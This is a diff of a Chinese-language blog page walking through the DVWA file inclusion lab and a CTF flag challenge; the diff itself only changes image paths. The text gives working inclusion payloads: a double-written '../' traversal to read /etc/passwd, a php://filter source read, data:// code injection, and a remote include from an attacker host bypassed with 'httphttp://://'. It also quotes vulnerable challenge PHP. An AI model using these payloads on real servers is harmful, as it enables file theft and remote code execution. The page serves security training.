-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa16.png" alt></p>
+<p><img src="/images/125dvwa16.png" alt></p>
 <p>再次修改 <code>page=....//....//....//....//....//....//etc/passwd</code>，可以得到内容，所以程序很可能对敏感字符做了处理，但是可以通过双拼绕过。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa19.png" alt></p>
+<p><img src="/images/125dvwa19.png" alt></p>
 <p>修改 <code>page=php://filter/read=convert.base64-encode/resource=include.php</code>，查看源码。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa17.png" alt></p>
+<p><img src="/images/125dvwa17.png" alt></p>
 <p>解码可得源码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the right PHP functions are enabled</span></span><br><span class="line">$WarningHtml = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>( !ini_get( <span class="string">'allow_url_include'</span> ) ) &#123;</span><br><span class="line">	$WarningHtml .= <span class="string">"&lt;div class=\"warning\"&gt;The PHP function &lt;em&gt;allow_url_include&lt;/em&gt; is not enabled.&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !ini_get( <span class="string">'allow_url_fopen'</span> ) ) &#123;</span><br><span class="line">	$WarningHtml .= <span class="string">"&lt;div class=\"warning\"&gt;The PHP function &lt;em&gt;allow_url_fopen&lt;/em&gt; is not enabled.&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">&lt;div class=\"body_padded\"&gt;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#123;$WarningHtml&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&lt;div class=\"vulnerable_code_area\"&gt;</span></span><br><span class="line"><span class="string">		[&lt;em&gt;&lt;a href=\"?page=file1.php\"&gt;file1.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\"?page=file2.php\"&gt;file2.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\"?page=file3.php\"&gt;file3.php&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">	&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;ul&gt;</span></span><br><span class="line"><span class="string">		&lt;li&gt;"</span> . dvwaExternalLinkUrlGet( <span class="string">'https://en.wikipedia.org/wiki/Remote_File_Inclusion'</span> ) . <span class="string">"&lt;/li&gt;</span></span><br><span class="line"><span class="string">		&lt;li&gt;"</span> . dvwaExternalLinkUrlGet( <span class="string">'https://www.owasp.org/index.php/Top_10_2007-A3'</span> ) . <span class="string">"&lt;/li&gt;</span></span><br><span class="line"><span class="string">	&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>修改 <code>page=data://text/plain,abc &lt;?php phpinfo();?&gt;</code>，查看页面。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa18.png" alt></p>
+<p><img src="/images/125dvwa18.png" alt></p>
 <p>修改 <code>page=http://your-ip/show.php</code> ，利用远程包含，发现没有显示内容。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa20.png" alt></p>
+<p><img src="/images/125dvwa20.png" alt></p>
 <p>由于 <code>php://filter</code> 和 <code>data://</code>都显示内容了，所以很可能对 <code>http</code> 这四个字符做了处理。尝试了 <code>http</code> 字符多个位置双拼都不行，可能是对 <code>http://</code> 做了处理，尝试下 <code>httphttp://://</code> ，发现可以绕过。修改 <code>page=httphttp://://your-ip/show.php</code>。查看页面。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa21.png" alt></p>
+<p><img src="/images/125dvwa21.png" alt></p>
 <h4 id="难度-high"><a href="#难度-high" class="headerlink" title="难度 high"></a>难度 high</h4><p>修改 <code>page=./include.php</code>。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa22.png" alt></p>
+<p><img src="/images/125dvwa22.png" alt></p>
 <h3 id="获取虚拟机中的-flag"><a href="#获取虚拟机中的-flag" class="headerlink" title="获取虚拟机中的 flag"></a>获取虚拟机中的 flag</h3><p>查看源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">$a=<span class="keyword">isset</span>($_GET[<span class="string">"a"</span>])?$_GET[<span class="string">"a"</span>]:<span class="string">''</span>;</span><br><span class="line">$b=<span class="keyword">isset</span>($_GET[<span class="string">"b"</span>])?$_GET[<span class="string">"b"</span>]:<span class="string">''</span>;</span><br><span class="line">$c=<span class="keyword">isset</span>($_GET[<span class="string">"c"</span>])?$_GET[<span class="string">"c"</span>]:<span class="string">''</span>;</span><br><span class="line">$d=<span class="keyword">isset</span>($_GET[<span class="string">"d"</span>])?$_GET[<span class="string">"d"</span>]:<span class="string">''</span>;</span><br><span class="line">$e=<span class="keyword">isset</span>($_GET[<span class="string">'e'</span>])?$_GET[<span class="string">'e'</span>]:<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This not allow pseudo protocol!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This also not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((@file_get_contents($a,<span class="string">'r'</span>)===$b)&amp;&amp;(@file_get_contents($e,<span class="string">'r'</span>)===<span class="string">"I'm Administrator!"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$c))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="comment">// get class.php</span></span><br><span class="line">        @<span class="keyword">include</span>($c);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! &lt;br&gt;"</span>;</span><br><span class="line">&#125; </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 
 <p>简单的流程图</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa23.png" alt></p>
+<p><img src="/images/125dvwa23.png" alt></p>
 <p>对 <code>a</code> 使用远程包含的方法输入值，对 <code>b</code> 直接输入值，对 <code>e</code> 使用 <code>php://input</code> 的方法。</p>
-<p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C125dvwa24.png" alt></p>
+<p><img src="/images/125dvwa24.png" alt></p>
 
             
 
